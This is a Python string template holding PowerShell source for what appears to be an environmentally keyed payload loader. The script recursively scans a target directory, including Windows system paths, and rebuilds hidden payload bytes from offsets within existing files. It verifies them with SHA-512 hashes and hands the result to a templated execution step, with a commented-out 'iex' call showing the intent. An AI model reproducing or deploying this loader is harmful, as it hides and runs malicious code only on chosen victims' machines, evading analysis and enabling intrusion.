buildcode="""
function Get-DecryptedString($key, $encryptedStringWithIV) {{
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    #$bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Get-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}}

function Get-CheckHash($payload, $payload_hash, $minus_bytes) {{
    $sha512 = new-Object System.Security.Cryptography.SHA512Managed
    $end = $payload.Length - $minus_bytes -1
    $compHash = $sha512.ComputeHash($payload)
    $temp_stuff =  [System.BitConverter]::ToString($sha512.ComputeHash($payload[0..$end])).ToLower().Replace("-", "")
    write-host $temp_stuff
    write-host $payload_hash
    if ([System.BitConverter]::ToString($sha512.ComputeHash($payload[0..$end])).ToLower().Replace("-", "").Equals($payload_hash)) {{
        return 1
    }} Else {{
        return 0
    }}
}}

function Get-CodeExecution($payload){{
    
    #iex ([System.Text.Encoding]::ASCII.GetString($payload))
    {3}
}}

function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternumhash, $minus_bytes, $scan_dir){{
    
    "[*] Hash Iterations: " + $iteration_temp
        
    # open file
    "[*] File: " + $some_file
    try {{
        $read_file = [System.IO.File]::ReadAllBytes($some_file)
        $tLoc = 0
        $tsize = 0
        $tmpstitchCheck = @()
        $itr = 0

        #WTF powershell inclusive arrays too
        while($itr -lt $small_table.Length){{
            $tmp1 = $itr+2
            $tmp2 = $itr+3
            "[*] Table Length: " + $small_table.Length
            "[*] Iterator: " + $itr
            "[*] Raw Location: " + ([Byte[]] $small_table[$itr..$tmp1]) + [Byte[]] 0x00
            "[*] Raw Size: " + ([Byte[]] $small_table[$tmp2]) + [Byte[]] 0x00
            $rLoc =  ([Byte[]] $small_table[$itr..$tmp1]) + [Byte[]] 0x00
            $rSz =   ([Byte[]] $small_table[$tmp2]) + [Byte[]] 0x00
            $tLoc = [bitconverter]::ToUInt32($rLoc, 0) 
            $tsize = [bitconverter]::ToUInt16($rSz, 0)
            "[*] Converted Location: " + $tLoc
            "[*] Converted Size: " + $tsize
            $tmpstitchCheck += [Byte[]] $read_file[$tLoc..($tLoc+$tsize-1)]
            $tLoc = 0
            $tsize = 0
            $itr+= 4
        }}
        #have to get rid of the first value inserted to create the byte array holder
        $stitchCheck = $tmpstitchCheck
        $stitchCheck.GetType()
        "Length of the Rebuilt Data: ", $stitchCheck.Length
        #$keyvalue = $read_file[$location..($location + $key_len - 1)]
        #$sha512 = new-Object System.Security.Cryptography.SHA512Managed
        
    }} Catch {{
        return 0
    }}
    
    #no minus bytes for the small check
    $result = Get-CheckHash $stitchCheck $iternumhash 0

   ##################################################################
   #shoul have iterative function here, but not today
    if ($result -eq 1){{
        "[*] Short Hashes Match!"
        "[*] Full Hash Match Verification"
            
        # open file
        "[*] File: ", $some_file
        try {{
        $read_file = [System.IO.File]::ReadAllBytes($some_file)
        $tLoc = 0
        $tsize = 0
        $tmpstitchCheck = @()
        $itr = 0

        #WTF powershell inclusive arrays too
        while($itr -lt $full_table.Length){{
            $tmp1 = $itr+2
            $tmp2 = $itr+3
            "[*] Table Length: " + $small_table.Length
            "[*] Iterator: " + $itr
            "[*] Raw Location: " + ([Byte[]] $full_table[$itr..$tmp1]) + [Byte[]] 0x00
            "[*] Raw Size: " + ([Byte[]] $full_table[$tmp2]) + [Byte[]] 0x00
            $rLoc =  ([Byte[]] $full_table[$itr..$tmp1]) + [Byte[]] 0x00
            $rSz =   ([Byte[]] $full_table[$tmp2]) + [Byte[]] 0x00
            $tLoc = [bitconverter]::ToUInt32($rLoc, 0) 
            $tsize = [bitconverter]::ToUInt16($rSz, 0)
            "[*] Converted Location: " + $tLoc
            "[*] Converted Size: " + $tsize
            $tmpstitchCheck += [Byte[]] $read_file[$tLoc..($tLoc+$tsize-1)]
            $tLoc = 0
            $tsize = 0
            $itr+= 4
        }}
        #have to get rid of the first value inserted to create the byte array holder
        $stitchCheck = $tmpstitchCheck
        $stitchCheck.GetType()
        "Length of the Rebuilt Data: ", $stitchCheck.Length
        #$keyvalue = $read_file[$location..($location + $key_len - 1)]
        #$sha512 = new-Object System.Security.Cryptography.SHA512Managed
        
    }} Catch {{
        return 0
    }}
    
    #minus bytes required for the full check
    $result = Get-CheckHash $stitchCheck $payload_hash $minus_bytes
        
       if ($result -eq 1){{
        "[*] Final Hashes Match"
        Get-CodeExecution $stitchCheck
        return 0

        }}
    }}   
}}

function Get-Walk-OS($small_table,$full_table,$payload_hash,$iternumhash,$minus_bytes,$scan_dir){{
    $dir_parsing = get-childitem $scan_dir -recurse -force -ErrorAction SilentlyContinue | % {{$_.FullName}}
    [Environment]::Is64BitProcess
    #Select-String -Pattern sysnative
    $sys_paths = @( "c:\", "c:\windows", "c:\windows\system32")
    
    if ([Environment]::Is64BitProcess -eq 0 -And $sys_paths -contains $scan_dir) {{ # Is a 32bit process
        $dir_parsing += get-childitem "\Windows\sysnative" -recurse -force -ErrorAction SilentlyContinue | % {{$_.FullName}}
    }} 

    foreach ($some_file in $dir_parsing){{
        if ((Get-Item $some_file) -isnot [System.IO.DirectoryInfo] ){{
            Get-Item $some_file
            Get-R-Done $some_file $small_table $full_table $payload_hash $iternumhash $minus_bytes $scan_dir
        }}
    }}
}}


	$lookup_table = [System.Convert]::FromBase64String("{0}")
	$payload_hash = "{1}"
	$iternumhash = "{2}"
    $minus_bytes = {4}
	$scan_dir = "{5}"

    "Raw Table " + $lookup_table[0..20]
    $size_init_table = [bitconverter]::ToUInt32($lookup_table[0..3], 0)
    $size_full_table = $lookup_table.Length

    "Init (small) Table Size: " + $size_init_table

    $small_table = $lookup_table[4..(($size_init_table*4)+3)]
    $full_table = $lookup_table[4..($size_full_table-1)]
 
    #"Small Table: " , $small_table[0..20]
    if ($scan_dir.Contains("%")){{
        $scan_dir = [Environment]::GetEnvironmentVariable($scan_dir -replace "%")
    }}

    Get-Walk-OS $small_table $full_table $payload_hash $iternumhash $minus_bytes $scan_dir 
"""